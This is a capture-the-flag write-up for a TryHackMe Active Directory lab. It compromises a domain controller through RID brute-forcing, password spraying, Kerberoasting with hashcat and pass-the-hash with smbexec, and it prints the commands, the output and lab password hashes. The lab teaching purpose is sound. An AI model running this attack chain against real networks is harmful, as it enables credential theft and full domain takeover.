---
tags:
  - THM
  - Windows
  - Easy
  - AD
  - Brute-Force
  - Kerberoasting
  - PtH
---
https://tryhackme.com/room/soupedecode01/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.201.35.148 SOUPEDECODE.LOCAL
```
# Scanning
The machine is a Windows Domain Controller:
```console
$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49664,49668,49673,49710,49805 -sV -sC SOUPEDECODE.LOCAL

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-09 00:51:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2025-06-17T21:35:42
|_Not valid after:  2025-12-17T21:35:42
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-09T00:52:25+00:00
|_ssl-date: 2025-08-09T00:53:04+00:00; -2s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49710/tcp open  msrpc         Microsoft Windows RPC
49805/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-08-09T00:52:26
|_  start_date: N/A
```
# Enumeration
## SMB Users
**Guest** is a valid user in SMB:
```console
$ netexec smb SOUPEDECODE.LOCAL -u 'guest' -p '' --shares

SMB         10.201.35.148   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domin:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.201.35.148   445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB         10.201.35.148   445    DC01             [*] Enumerated shares
SMB         10.201.35.148   445    DC01             Share           Permissions     Remark
SMB         10.201.35.148   445    DC01             -----           -----------     ------
SMB         10.201.35.148   445    DC01             ADMIN$                          Remote Admin
SMB         10.201.35.148   445    DC01             backup                          
SMB         10.201.35.148   445    DC01             C$                              Default share
SMB         10.201.35.148   445    DC01             IPC$            READ            Remote IPC
SMB         10.201.35.148   445    DC01             NETLOGON                        Logon server share 
SMB         10.201.35.148   445    DC01             SYSVOL                          Logon server share 
SMB         10.201.35.148   445    DC01             Users                           
```
Since we can read the IPC$, we perform a RID brute-force attack to enumerate **valid domain users**, saving the output in `RID_brute.txt`:
```console
$ netexec smb SOUPEDECODE.LOCAL -u 'guest' -p '' --rid-brute | tee RID_brute.txt

SMB         10.201.35.148   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domin:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.201.35.148   445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB         10.201.35.148   445    DC01             498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.201.35.148   445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
SMB         10.201.35.148   445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
SMB         10.201.35.148   445    DC01             502: SOUPEDECODE\krbtgt (SidTypeUser)
SMB         10.201.35.148   445    DC01             512: SOUPEDECODE\Domain Admins (SidTypeGroup)
SMB         10.201.35.148   445    DC01             513: SOUPEDECODE\Domain Users (SidTypeGroup)
SMB         10.201.35.148   445    DC01             514: SOUPEDECODE\Domain Guests (SidTypeGroup)
SMB         10.201.35.148   445    DC01             515: SOUPEDECODE\Domain Computers (SidTypeGroup)
SMB         10.201.35.148   445    DC01             516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
SMB         10.201.35.148   445    DC01             517: SOUPEDECODE\Cert Publishers (SidTypeAlias)
SMB         10.201.35.148   445    DC01             518: SOUPEDECODE\Schema Admins (SidTypeGroup)
SMB         10.201.35.148   445    DC01             519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)
SMB         10.201.35.148   445    DC01             520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.201.35.148   445    DC01             521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.201.35.148   445    DC01             522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.201.35.148   445    DC01             525: SOUPEDECODE\Protected Users (SidTypeGroup)
SMB         10.201.35.148   445    DC01             526: SOUPEDECODE\Key Admins (SidTypeGroup)
SMB         10.201.35.148   445    DC01             527: SOUPEDECODE\Enterprise Key Admins (SidTypeGroup)
SMB         10.201.35.148   445    DC01             553: SOUPEDECODE\RAS and IAS Servers (SidTypeAlias)
SMB         10.201.35.148   445    DC01             571: SOUPEDECODE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.201.35.148   445    DC01             572: SOUPEDECODE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.201.35.148   445    DC01             1000: SOUPEDECODE\DC01$ (SidTypeUser)
SMB         10.201.35.148   445    DC01             1101: SOUPEDECODE\DnsAdmins (SidTypeAlias)
SMB         10.201.35.148   445    DC01             1102: SOUPEDECODE\DnsUpdateProxy (SidTypeGroup)
SMB         10.201.35.148   445    DC01             1103: SOUPEDECODE\bmark0 (SidTypeUser)
...
```
Save the **valid RID users** in a file called `RID_users.txt`. Then, found **user ybob317** that uses his own username as password:
```console
$ grep -oP '(?<=SOUPEDECODE\\).*(?=\s\(SidTypeUser\))' RID_brute.txt | grep -v '\$$' > RID_users.txt

$ netexec smb SOUPEDECODE.LOCAL -u RID_users.txt -p RID_users.txt --no-brute --continue-on-success
SMB         10.201.35.148   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domin:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:Administrator STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\bmark0:bmark0 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\otara1:otara1 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\kleo2:kleo2 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\eyara3:eyara3 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\pquinn4:pquinn4 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\jharper5:jharper5 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\bxenia6:bxenia6 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\gmona7:gmona7 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\oaaron8:oaaron8 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\pleo9:pleo9 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\evictor10:evictor10 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\wreed11:wreed11 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\bgavin12:bgavin12 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\ndelia13:ndelia13 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\akevin14:akevin14 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\kxenia15:kxenia15 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\ycody16:ycody16 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\qnora17:qnora17 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\dyvonne18:dyvonne18 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\qxenia19:qxenia19 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\rreed20:rreed20 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\icody21:icody21 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\ftom22:ftom22 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\ijake23:ijake23 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\rpenny24:rpenny24 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\jiris25:jiris25 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\colivia26:colivia26 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\pyvonne27:pyvonne27 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\zfrank28:zfrank28 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
...
```
By exploring his files, we get the **user flag**:
```bash
smbclient //SOUPEDECODE.LOCAL/Users/ -U 'ybob317%ybob317' -c 'cd ybob317/Desktop; get user.txt' >& /dev/null && cat user.txt
```
## Kerberoasting
Find the hashes for the Ticket Granting Tickets in `hashes.txt`:
```console
$ GetUserSPNs.py -request -outputfile hashes.txt 'SOUPEDECODE.LOCAL/ybob317:ybob317'

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 11:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 11:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 11:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 11:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 11:29:18.511871  <never>               
```
Cracked password for the **user file_svc**:
```console
$ hashcat --quiet -a 0 -m 13100 hashes.txt /usr/share/dict/rockyou.txt

$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$96ad1fdb37ac4af8014634edc4891664$9bf05ea8467f1a9169a6da9d4233a52d1786f0ad2c469e5ef0b96f2afd586139ff51638c775f17520bc38e9524385782762bd783363e1889f7aeaf0a64b8fd90116daeb7d3763b7e0978f3a36eb98b72b6bf784832a27a9e53590729280b68b2fae380582de284956da81bb3226aa4266343bd685981c7867fd492010a49b3a3853a276fb41ee98c94ca701ae99b6236e61e98b87f270a24555cca9fba2c3d9d1c4d4edb7ba1e9f84ab8e0a3e5ee915a30d05560651c4298a9bc16cdee0a332a39a59b167096ba767315e809012726304607737843851ba0597fe3498bab6e8b939bb0bb5823c920685c0b22c3901bb521775dcfc6002f85d574258439835cab1e767228afb834b279bdaca7149913e3c079b9e8bd9c8beb881f46f3b6b72d53c750644118ca5ddbf03901f086738f7f1d7bf39a995a3ffa9064d4b5fe5d2858cbb149f130e5b1ec12666218b7090374abd45ab28f7d21367b4e4bb8dca099dd9172cab43d7d52665f9889b3c4c81175550d6c2c7529441737f6e56d8345d0ba1699ca9926d9355d1f3a1f99d3eb448b7f5925b9a06fe6fd92cbbad7678b7ab1b43b6f295415c47e5746c44a53354998e26763ac70a068163b095a9dee0966cb9e2e17203a1993d27638832eb3a50ff25ac08e95c399b77b5bf08362d19341fbe00fea605a8c48a7970b9231ff9992d0bf4ce7ab6d08a789b9d2c844c6dda1e14af0bc7c7aecfe4b45584cf08216a623216c26182b6afb670395b60c8fcf3375858d1a2673ea66fa35ea26251d17c5b8785529d6052cfe73aa81aeb9ec261465917e182e84ae2b3c4a3803101eaf43083d865acdef3a7a2362fbfd27fe9d3da45b3be998a801e7c4d5154915427fa4e73c75670d14d22c26ded8c0090a0395d08e6329348162b4f92e50b2ad1491ec3c4c5a8b15a289f3d996f830bbf7c985622a307c817eda195df5841b6e366531918888cb4f4e71ba39de3533d056c1a8b876c4e815dcf1db94e2efdfadcfe4634e2e3d909018b965e55ff86324dabdd8f5b15b1cb96db3d4d585352ed27ce5f32daade97ce5707998169d11262c9ae2dcce15f48e550fe7f7fe3be5f691fe188439a377272bb5aab6eef2fd5cafba913e083d5d433e395591562ff943cab9842fb93d80fca40af1211a1104085d554b5e640213647bdfdda0adc9905656f7d16aceb19bac310513357cc530ffbf7a427fdbe23c6e45f6fe6622219c77d283645be890aa7111745dde89bb9d9a43d00ee1f3d3d914f5de12a2542bb817f216916bd34522efd14ad3d57069aa4cf7563c7f82c2432cf3fc04a1e1d4d5c37dab8c06b2def4f05799e80107e7b7ba90005757e87c4291ab7d666fdddbf19077dbf566857dad460d29529dfcde09ed3184fe359f1add3083cd9ba8994d83f63c246d0981c141c642c056a07167c584d918fad09c74f9097ddcad168bdf90c9cabc8a636274248f8eed7e8750c6125bc9841e97d57:Password123!!
```
## Pass-the-Hash
Now, we can read the backup share:
```console
$ netexec smb SOUPEDECODE.LOCAL -u 'file_svc' -p 'Password123!!' --shares

SMB         10.201.35.148   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domin:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.201.35.148   445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
SMB         10.201.35.148   445    DC01             [*] Enumerated shares
SMB         10.201.35.148   445    DC01             Share           Permissions     Remark
SMB         10.201.35.148   445    DC01             -----           -----------     ------
SMB         10.201.35.148   445    DC01             ADMIN$                          Remote Admin
SMB         10.201.35.148   445    DC01             backup          READ            
SMB         10.201.35.148   445    DC01             C$                              Default share
SMB         10.201.35.148   445    DC01             IPC$            READ            Remote IPC
SMB         10.201.35.148   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.201.35.148   445    DC01             SYSVOL          READ            Logon server share 
SMB         10.201.35.148   445    DC01             Users                           
```
Found file named `backup_extract.txt` with a list of users and their corresponding hashes:
```console
$ smbclient //SOUPEDECODE.LOCAL/backup/ -U 'file_svc%Password123!!' -c 'get backup_extract.txt' && cat backup_extract.txt

WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```
Separate the users and hashes into `backup_users.txt` and `backup_hashes.txt` files:
```console
$ cut -d ':' -f 1 backup_extract.txt > backup_users.txt

$ cut -d ':' -f 4 backup_extract.txt > backup_hashes.txt
```
Try a Pass-the-Hash attack for every user:
```console
$ netexec smb SOUPEDECODE.LOCAL -u backup_users.txt -H backup_hashes.txt --no-brute --continue-on-success

SMB         10.201.35.148   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domin:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\WebServer$:c47b45f5d4df5a494bd19f13e14f7902 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\DatabaseServer$:406b424c7b483a42458bf6f545c936f7 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\CitrixServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\MailServer$:46a4655f18def136b3bfab7b0b4e70e3 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\BackupServer$:46a4655f18def136b3bfab7b0b4e70e3 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\ApplicationServer$:8cd90ac6cba6dde9d8038b068c17e9f5 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\PrintServer$:b8a38c432ac59ed00b2a373f4f050d28 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\ProxyServer$:4e3f0bb3e5b6e3e662611b1a87988881 STATUS_LOGON_FAILURE 
SMB         10.201.35.148   445    DC01             [-] SOUPEDECODE.LOCAL\MonitoringServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE 
```
As we can see, the user **FileServer$** not only has access, but is also an administrator.
# Exploitation
Get an interactive shell by executing Pass-the-Hash as **FileServer$**:
```console
$ smbexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559' 'SOUPEDECODE.LOCAL/FileServer$@SOUPEDECODE.LOCAL'

C:\Windows\system32>whoami
nt authority\system
```
Get the **root flag**:
```cmd
type C:\Users\Administrator\Desktop\root.txt
```